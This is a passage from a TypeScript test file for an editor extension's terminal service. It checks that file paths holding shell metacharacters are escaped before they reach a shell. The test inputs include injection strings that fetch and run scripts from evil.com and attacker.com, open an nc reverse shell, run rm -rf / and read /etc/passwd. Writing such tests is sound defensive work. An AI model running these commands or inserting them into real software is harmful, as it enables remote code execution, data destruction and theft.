          assert.fail(`Should not throw error for valid command with arguments: ${error}`);
        }
      });

      test('should accept valid terminal with full path in full workflow', async () => {
        const service = TestHelpers.setupExternalTerminal('/usr/bin/gnome-terminal --working-directory={{directory}}');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openInTerminal(paths.unixFile);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created for valid full path command');
        } catch (error) {
          assert.fail(`Should not throw error for valid full path command: ${error}`);
        }
      });
    });
  });

  suite('escapePathForShell Security Tests', () => {
    // Helper to access private escapePathForShell method
    function callEscapePathForShell(service: TerminalService, filePath: string): string {
      return (service as any).escapePathForShell(filePath);
    }

    // Store original platform
    const originalPlatform = process.platform;

    setup(() => {
      // Reset TerminalService singleton
      (TerminalService as any).instance = null;
    });

    teardown(() => {
      // Restore original platform and clean up
      Object.defineProperty(process, 'platform', { value: originalPlatform });
      (TerminalService as any).instance = null;
    });

    suite('Unix/Linux/macOS Escaping', () => {

      test('should escape paths with single quotes', () => {
        const service = TerminalService.getInstance();
        const input = "/home/user/path'with'quotes";
        const escaped = callEscapePathForShell(service, input);

        // Single quotes should be escaped as '\''
        assert.strictEqual(escaped, "'/home/user/path'\\''with'\\''quotes'");
      });

      test('should escape paths with backticks (command substitution)', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/`touch /tmp/pwned`';
        const escaped = callEscapePathForShell(service, input);

        // Backticks should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/`touch /tmp/pwned`'");
      });

      test('should escape paths with dollar sign (variable expansion)', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/$HOME/pwned';
        const escaped = callEscapePathForShell(service, input);

        // Dollar signs should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/$HOME/pwned'");
      });

      test('should escape paths with double quotes', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path"with"quotes';
        const escaped = callEscapePathForShell(service, input);

        // Double quotes should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path\"with\"quotes'");
      });

      test('should escape paths with semicolons (command separators)', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path;rm -rf /';
        const escaped = callEscapePathForShell(service, input);

        // Semicolons should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path;rm -rf /'");
      });

      test('should escape paths with ampersands (command separators)', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path&malicious';
        const escaped = callEscapePathForShell(service, input);

        // Ampersands should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path&malicious'");
      });

      test('should escape paths with pipes', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path|cat';
        const escaped = callEscapePathForShell(service, input);

        // Pipes should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path|cat'");
      });

      test('should escape paths with redirects', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path>/tmp/output';
        const escaped = callEscapePathForShell(service, input);

        // Redirects should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path>/tmp/output'");
      });

      test('should escape paths with newlines', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path\nmalicious';
        const escaped = callEscapePathForShell(service, input);

        // Newlines should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path\nmalicious'");
      });

      test('should escape paths with wildcards', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path/*.txt';
        const escaped = callEscapePathForShell(service, input);

        // Wildcards should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path/*.txt'");
      });

      test('should escape paths with question marks', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path/file?.txt';
        const escaped = callEscapePathForShell(service, input);

        // Question marks should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path/file?.txt'");
      });

      test('should escape paths with square brackets', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path/file[0-9].txt';
        const escaped = callEscapePathForShell(service, input);

        // Square brackets should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path/file[0-9].txt'");
      });

      test('should escape paths with curly braces', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path/file{a,b,c}.txt';
        const escaped = callEscapePathForShell(service, input);

        // Curly braces should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path/file{a,b,c}.txt'");
      });

      test('should escape paths with parentheses', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path(file)';
        const escaped = callEscapePathForShell(service, input);

        // Parentheses should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path(file)'");
      });

      test('should escape paths with exclamation marks', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path!important';
        const escaped = callEscapePathForShell(service, input);

        // Exclamation marks should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path!important'");
      });

      test('should escape paths with tilde', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/~backup/path';
        const escaped = callEscapePathForShell(service, input);

        // Tildes should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/~backup/path'");
      });

      test('should escape paths with hash (comment)', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path#comment';
        const escaped = callEscapePathForShell(service, input);

        // Hashes should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path#comment'");
      });

      test('should escape paths with backslashes', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path\\with\\backslash';
        const escaped = callEscapePathForShell(service, input);

        // Backslashes should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path\\with\\backslash'");
      });

      test('should escape paths with spaces', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path with spaces';
        const escaped = callEscapePathForShell(service, input);

        // Paths with spaces should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path with spaces'");
      });

      test('should handle normal paths without special characters', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/project/src/file.ts';
        const escaped = callEscapePathForShell(service, input);

        // Normal paths should just be wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/project/src/file.ts'");
      });

      test('should handle empty strings', () => {
        const service = TerminalService.getInstance();
        const escaped = callEscapePathForShell(service, '');

        // Empty string should return empty string (not quoted)
        assert.strictEqual(escaped, '');
      });

      test('should escape complex command injection attempts', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/$(rm -rf /)';
        const escaped = callEscapePathForShell(service, input);

        // Command substitution should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/$(rm -rf /)'");
      });

      test('should escape paths with multiple single quotes', () => {
        const service = TerminalService.getInstance();
        const input = "/home/user/'path1'/'path2'";
        const escaped = callEscapePathForShell(service, input);

        // Each single quote should be individually escaped
        // The pattern is: replace ' with '\'' then wrap in single quotes
        // Input: /home/user/'path1'/'path2'
        // After replace: /home/user/'\''path1'\''/'\''path2'\''
        // After wrapping: '/home/user/'\''path1'\''/'\''path2'\''''
        assert.strictEqual(escaped, "'/home/user/'\\''path1'\\''/'\\''path2'\\'''");
      });

      test('should escape paths with tab characters', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path\twith\ttabs';
        const escaped = callEscapePathForShell(service, input);

        // Tabs should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path\twith\ttabs'");
      });

      test('should escape paths with carriage returns', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path\rwith\rreturns';
        const escaped = callEscapePathForShell(service, input);

        // Carriage returns should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path\rwith\rreturns'");
      });

      test('should escape paths with null bytes', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path\0null';
        const escaped = callEscapePathForShell(service, input);

        // Null bytes should be safely wrapped in single quotes (if they make it this far)
        assert.strictEqual(escaped, "'/home/user/path\0null'");
      });

      test('should escape paths with percent signs', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path%20with%20percents';
        const escaped = callEscapePathForShell(service, input);

        // Percent signs should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path%20with%20percents'");
      });

      test('should escape paths with at signs', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path@user';
        const escaped = callEscapePathForShell(service, input);

        // At signs should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path@user'");
      });

      test('should escape paths with equals signs', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path=value';
        const escaped = callEscapePathForShell(service, input);

        // Equals signs should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path=value'");
      });

      test('should escape paths with plus signs', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path+more';
        const escaped = callEscapePathForShell(service, input);

        // Plus signs should be safely wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path+more'");
      });

      test('should escape paths with underscores', () => {
        const service = TerminalService.getInstance();
        const input = '/home/user/path_with_underscores';
        const escaped = callEscapePathForShell(service, input);

        // Underscores are safe but should still be wrapped in single quotes
        assert.strictEqual(escaped, "'/home/user/path_with_underscores'");
      });
    });

    suite('Windows Escaping', () => {
      const originalPlatform = process.platform;

      setup(() => {
        // Mock platform as win32 for Windows tests
        Object.defineProperty(process, 'platform', { value: 'win32' });
      });

      teardown(() => {
        // Restore original platform
        Object.defineProperty(process, 'platform', { value: originalPlatform });
      });

      test('should escape paths with ampersands', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User&malicious\\path';
        const escaped = callEscapePathForShell(service, input);

        // Ampersands should be escaped with caret
        assert.ok(escaped.includes('^&'));
      });

      test('should escape paths with pipes', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User|malicious\\path';
        const escaped = callEscapePathForShell(service, input);

        // Pipes should be escaped with caret
        assert.ok(escaped.includes('^|'));
      });

      test('should escape paths with parentheses', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User(malicious)\\path';
        const escaped = callEscapePathForShell(service, input);

        // Parentheses should be escaped with caret
        assert.ok(escaped.includes('^(') || escaped.includes('^)'));
      });

      test('should escape paths with angle brackets', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User<malicious>\\path';
        const escaped = callEscapePathForShell(service, input);

        // Angle brackets should be escaped with caret
        assert.ok(escaped.includes('^<') || escaped.includes('^>'));
      });

      test('should escape paths with carets', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User^malicious\\path';
        const escaped = callEscapePathForShell(service, input);

        // Carets should be double-escaped
        assert.ok(escaped.includes('^^'));
      });

      test('should escape paths with double quotes', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User"malicious"\\path';
        const escaped = callEscapePathForShell(service, input);

        // Double quotes should be escaped
        assert.ok(escaped.includes('\\"'));
      });

      test('should escape paths with percent signs', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User%malicious\\path';
        const escaped = callEscapePathForShell(service, input);

        // Percent signs should be double-percented to prevent variable expansion
        assert.ok(escaped.includes('%%'));
      });

      test('should wrap paths with spaces in quotes', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User\\path with spaces';
        const escaped = callEscapePathForShell(service, input);

        // Paths with spaces should be wrapped in double quotes
        assert.ok(escaped.startsWith('"') && escaped.endsWith('"'));
      });

      test('should handle normal Windows paths without special characters', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User\\project\\src\\file.ts';
        const escaped = callEscapePathForShell(service, input);

        // Normal paths should not need escaping
        assert.strictEqual(escaped, input);
      });

      test('should handle empty strings', () => {
        const service = TerminalService.getInstance();
        const escaped = callEscapePathForShell(service, '');

        // Empty string should return empty
        assert.strictEqual(escaped, '');
      });

      test('should escape paths with multiple special characters', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User & |<>^" %\\path';
        const escaped = callEscapePathForShell(service, input);

        // All special characters should be escaped
        assert.ok(escaped.includes('^&'));
        assert.ok(escaped.includes('^|'));
        assert.ok(escaped.includes('^<') || escaped.includes('^>'));
        assert.ok(escaped.includes('^^'));
        assert.ok(escaped.includes('%%'));
      });

      test('should handle UNC paths', () => {
        const service = TerminalService.getInstance();
        const input = '\\\\server\\share\\path';
        const escaped = callEscapePathForShell(service, input);

        // UNC paths should be handled without unnecessary escaping
        assert.ok(escaped.includes('\\\\'));
      });

      test('should escape paths with semicolons', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User;malicious\\path';
        const escaped = callEscapePathForShell(service, input);

        // Semicolons might not be explicitly escaped but path should be safe
        // (Windows cmd.exe treats semicolon as a command separator)
        assert.ok(escaped.length > 0);
      });

      test('should escape paths with newlines', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User\nmalicious\\path';
        const escaped = callEscapePathForShell(service, input);

        // Newlines should be preserved in the escaped path
        assert.ok(escaped.includes('\n'));
      });

      test('should escape paths with tabs', () => {
        const service = TerminalService.getInstance();
        const input = 'C:\\Users\\User\tmalicious\\path';
        const escaped = callEscapePathForShell(service, input);

        // Tabs should trigger escaping
        assert.ok(escaped.length > 0);
      });
    });

    suite('Platform-Specific Behavior', () => {
      test('should use Unix escaping on Linux', () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'linux' });

          const service = TerminalService.getInstance();
          const input = "/home/user/path'with'quotes";
          const escaped = callEscapePathForShell(service, input);

          // Should use single quote escaping
          assert.strictEqual(escaped.charAt(0), "'");
          assert.strictEqual(escaped.charAt(escaped.length - 1), "'");
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should use Unix escaping on macOS', () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'darwin' });

          const service = TerminalService.getInstance();
          const input = "/home/user/path'with'quotes";
          const escaped = callEscapePathForShell(service, input);

          // Should use single quote escaping
          assert.strictEqual(escaped.charAt(0), "'");
          assert.strictEqual(escaped.charAt(escaped.length - 1), "'");
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should use Windows escaping on Windows', () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TerminalService.getInstance();
          const input = 'C:\\Users\\User&path';
          const escaped = callEscapePathForShell(service, input);

          // Should use caret escaping
          assert.ok(escaped.includes('^&'));
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });
    });

    suite('Security Integration Tests', () => {
      test('should prevent command injection through path in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory={{directory}}');

        // Use a path that attempts command injection
        const maliciousPath = '/home/user/$(rm -rf /)';
        TestSetup.addFile('/home/user', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);

          // Should not throw error, but the path should be escaped
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();

          if (terminal) {
            // Verify the command was sent
            assert.ok(terminal.name.includes('External'));
          }
        } catch (error) {
          assert.fail(`Should handle escaped path without error: ${error}`);
        }
      });

      test('should prevent command injection through path in system default terminal (Linux)', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'linux' });

          const service = TestHelpers.setupSystemDefaultTerminal();

          // Use a path that attempts command injection
          const maliciousPath = '/home/user/`touch /tmp/pwned`';
          TestSetup.addFile('/home/user', true);

          try {
            await service.openDirectoryInTerminal(maliciousPath);

            // Should not throw error, but the path should be escaped
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();

            if (terminal) {
              assert.ok(terminal.name.includes('System'));
            }
          } catch (error) {
            assert.fail(`Should handle escaped path without error: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should prevent command injection through path in system default terminal (Windows)', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupSystemDefaultTerminal();

          // Use a path that attempts command injection
          const maliciousPath = 'C:\\Users\\User&rm -rf C:\\';
          TestSetup.addFile('C:\\Users\\User', true);

          try {
            await service.openDirectoryInTerminal(maliciousPath);

            // Should not throw error, but the path should be escaped
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();

            if (terminal) {
              assert.ok(terminal.name.includes('System'));
            }
          } catch (error) {
            assert.fail(`Should handle escaped path without error: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });
    });
  });

  suite('Malicious Path Handling Integration Tests', () => {
    setup(() => {
      // Reset TerminalService singleton before each test
      (TerminalService as any).instance = null;
    });

    teardown(() => {
      (TerminalService as any).instance = null;
    });

    suite('Integrated Terminal with Malicious Paths', () => {
      test('should safely handle path with command substitution $(...) in integrated terminal', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/$(rm -rf /)/project';
        // Add the parent directory so path validation passes
        TestSetup.addFile('/home/user/$(rm -rf /)', true);
        TestSetup.addFile('/home/user/$(rm -rf /)/project', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          // Should not execute the command, path should be safely escaped
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with backtick substitution in integrated terminal', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/`touch /tmp/pwned`/project';
        TestSetup.addFile('/home/user/`touch /tmp/pwned`', true);
        TestSetup.addFile('/home/user/`touch /tmp/pwned`/project', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with semicolon command separator in integrated terminal', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/path;rm -rf /';
        TestSetup.addFile('/home/user/path;rm -rf /', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with pipe in integrated terminal', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/path|cat /etc/passwd';
        TestSetup.addFile('/home/user/path|cat /etc/passwd', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with redirect in integrated terminal', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/path>/tmp/output';
        TestSetup.addFile('/home/user/path>/tmp/output', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with variable expansion in integrated terminal', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/$HOME/path';
        TestSetup.addFile('/home/user/$HOME', true);
        TestSetup.addFile('/home/user/$HOME/path', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with newline in integrated terminal', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/path\nrm -rf /';
        TestSetup.addFile('/home/user/path\nrm -rf /', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with wildcards in integrated terminal', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/path/*.txt';
        TestSetup.addFile('/home/user/path', true);
        TestSetup.addFile('/home/user/path/*.txt', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with multiple shell metacharacters in integrated terminal', async () => {
        const service = TestHelpers.setupIntegratedTerminal();
        const maliciousPath = '/home/user/path;$(whoami)|`id`>/tmp/pwn';
        TestSetup.addFile('/home/user/path;$(whoami)|`id`>/tmp/pwn', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });
    });

    suite('External Terminal with Malicious Paths', () => {
      test('should safely handle path with command substitution in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory={{directory}}');
        const maliciousPath = '/home/user/$(rm -rf /)/project';
        TestSetup.addFile('/home/user/$(rm -rf /)', true);
        TestSetup.addFile('/home/user/$(rm -rf /)/project', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with backtick substitution in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory={{directory}}');
        const maliciousPath = '/home/user/`curl http://evil.com/shell.sh | bash`/project';
        TestSetup.addFile('/home/user/`curl http://evil.com/shell.sh | bash`', true);
        TestSetup.addFile('/home/user/`curl http://evil.com/shell.sh | bash`/project', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with semicolon in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory={{directory}}');
        const maliciousPath = '/home/user/path;nc -e /bin/sh attacker.com 4444';
        TestSetup.addFile('/home/user/path;nc -e /bin/sh attacker.com 4444', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with ampersand in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('konsole --workdir {{directory}}');
        const maliciousPath = '/home/user/path&malicious &';
        TestSetup.addFile('/home/user/path&malicious &', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with pipe in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('xfce4-terminal --working-directory={{directory}}');
        const maliciousPath = '/home/user/path|tee /tmp/output';
        TestSetup.addFile('/home/user/path|tee /tmp/output', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with redirect in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('xterm -e "cd {{directory}}"');
        const maliciousPath = '/home/user/path>~/ssh_keys';
        TestSetup.addFile('/home/user/path>~/ssh_keys', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with variable expansion in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('alacritty --working-directory {{directory}}');
        const maliciousPath = '/home/user/$USER/path/${HOME}/.ssh';
        TestSetup.addFile('/home/user/$USER', true);
        TestSetup.addFile('/home/user/$USER/path/${HOME}/.ssh', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with newline in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory={{directory}}');
        const maliciousPath = '/home/user/path\nexport EVIL=true';
        TestSetup.addFile('/home/user/path\nexport EVIL=true', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with parentheses in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory={{directory}}');
        const maliciousPath = '/home/user/path(subcommand)/evil';
        TestSetup.addFile('/home/user/path(subcommand)', true);
        TestSetup.addFile('/home/user/path(subcommand)/evil', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });

      test('should safely handle path with complex injection in external terminal', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory={{directory}}');
        const maliciousPath = '/home/user/; curl http://attacker.com/steal.sh | bash #';
        TestSetup.addFile('/home/user/; curl http://attacker.com/steal.sh | bash #', true);

        try {
          await service.openDirectoryInTerminal(maliciousPath);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created with safely escaped path');
        } catch (error) {
          assert.fail(`Should handle malicious path without error: ${error}`);
        }
      });
    });

    suite('System Default Terminal with Malicious Paths (Unix)', () => {
      test('should safely handle malicious path with system default terminal on Linux', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'linux' });

          const service = TestHelpers.setupSystemDefaultTerminal();
          const maliciousPath = '/home/user/$(rm -rf /)';
          TestSetup.addFile('/home/user/$(rm -rf /)', true);

          try {
            await service.openDirectoryInTerminal(maliciousPath);
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();
            assert.ok(terminal, 'Terminal should be created with safely escaped path');
          } catch (error) {
            assert.fail(`Should handle malicious path without error: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should safely handle malicious path with system default terminal on macOS', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'darwin' });

          const service = TestHelpers.setupSystemDefaultTerminal();
          const maliciousPath = '/Users/user/`whoami`/path';
          TestSetup.addFile('/Users/user/`whoami`', true);
          TestSetup.addFile('/Users/user/`whoami`/path', true);

          try {
            await service.openDirectoryInTerminal(maliciousPath);
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();
            assert.ok(terminal, 'Terminal should be created with safely escaped path');
          } catch (error) {
            assert.fail(`Should handle malicious path without error: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });
    });

    suite('System Default Terminal with Malicious Paths (Windows)', () => {
      test('should safely handle malicious path with system default terminal on Windows', async () => {
        const originalPlatform = process.platform;
        try {
          Object.defineProperty(process, 'platform', { value: 'win32' });

          const service = TestHelpers.setupSystemDefaultTerminal();
          const maliciousPath = 'C:\\Users\\User&malicious &\\path';
          TestSetup.addFile('C:\\Users\\User&malicious &', true);
          TestSetup.addFile('C:\\Users\\User&malicious &\\path', true);

          try {
            await service.openDirectoryInTerminal(maliciousPath);
            const mocks = TestSetup.getMocks();
            const terminal = mocks.vscode.getLastCreatedTerminal();
            assert.ok(terminal, 'Terminal should be created with safely escaped path');
          } catch (error) {
            assert.fail(`Should handle malicious path without error: ${error}`);
          }
        } finally {
          Object.defineProperty(process, 'platform', { value: originalPlatform });
        }
      });

      test('should safely handle path with caret on Windows system default terminal', async () => {
